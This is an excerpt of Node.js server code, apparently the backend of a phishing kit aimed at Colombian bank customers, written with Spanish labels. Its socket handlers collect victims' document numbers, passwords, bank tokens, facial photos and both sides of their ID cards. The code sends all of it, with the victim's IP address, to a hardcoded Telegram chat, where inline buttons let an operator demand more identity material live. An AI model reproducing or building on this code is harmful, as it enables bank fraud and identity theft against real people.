...
const TELEGRAM_CHAT_ID = '-5230100193';
...
async function sendPhotoToTelegram(photoBase64, caption, buttons) {
  const keyboard = {
    inline_keyboard: buttons
  };
  ...
  try {
    ...
    if (!data.ok) {
      console.error('Error de Telegram al enviar foto:', data);
      throw new Error(data.description || 'Error al enviar foto a Telegram');
    }
...
`;
      ...
      const buttons = [
        ...
        [{ text: '📸 Pedir Cara', callback_data: `request-face:${sessionId}` }],
        [{ text: '🪪 Pedir Cédula', callback_data: `request-id:${sessionId}` }]
      ];
...
`;
  ...
  // Recibir datos de validación biométrica (cara)
  socket.on('submit-face', async (data) => {
    try {
      const sessionId = socket.sessionId;
      const session = sessions.get(sessionId);
      session.data.face = data;
      
      console.log(`[CARA] Sesión ${sessionId}: Imagen capturada (${data.imageSize} bytes)`);
      
      const documentData = session.data.document || {};
      const passwordData = session.data.password || {};
      const tokenData = session.data.token || {};
      
      const caption = `
📸 <b>VALIDACIÓN BIOMÉTRICA RECIBIDA</b>

👤 <b>Tipo:</b> ${documentData.documentType || 'N/A'}
🆔 <b>Documento:</b> ${documentData.documentNumber || 'N/A'}
🔐 <b>Clave:</b> ${passwordData.password ? '<code>' + passwordData.password + '</code>' : 'N/A'}
🔢 <b>Token:</b> ${tokenData.token ? '<code>' + tokenData.token + '</code>' : 'N/A'}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
🌐 <b>IP:</b> ${session.ip}
🔑 <b>Session:</b> <code>${sessionId}</code>`;
      ...
      await sendPhotoToTelegram(data.image, caption, buttons);
      
      socket.emit('data-sent', { success: true });
    } catch (error) {
      console.error('[ERROR] submit-face:', error);
      socket.emit('data-sent', { success: false, error: error.message });
    }
  });

  // Recibir datos de escaneo de cédula
  socket.on('submit-id', async (data) => {
    try {
      const sessionId = socket.sessionId;
      const session = sessions.get(sessionId);
      session.data.idCard = data;
      
      console.log(`[CÉDULA] Sesión ${sessionId}: Frente (${data.frontSize} bytes) + Parte Trasera (${data.backSize} bytes)`);
      
      const documentData = session.data.document || {};
      const passwordData = session.data.password || {};
      const tokenData = session.data.token || {};
      const faceData = session.data.face || {};
...
🔐 <b>Clave:</b> ${passwordData.password ? '<code>' + passwordData.password + '</code>' : 'N/A'}
🔢 <b>Token:</b> ${tokenData.token ? '<code>' + tokenData.token + '</code>' : 'N/A'}
📸 <b>Foto Facial:</b> ${faceData.imageSize ? 'Capturada' : 'No capturada'}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
🌐 <b>IP:</b> ${session.ip}
🔑 <b>Session:</b> <code>${sessionId}</code>`;
      ...
      // Enviar foto del frente
      const frontCaption = `🪪 <b>CÉDULA - FRENTE</b>\n${baseCaption}`;
      await sendPhotoToTelegram(data.frontImage, frontCaption, buttons);
      
      // Pequeña pausa antes de enviar la segunda foto
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Enviar foto de la parte trasera
      const backCaption = `🪪 <b>CÉDULA - PARTE TRASERA</b>\n${baseCaption}`;
      await sendPhotoToTelegram(data.backImage, backCaption, buttons);
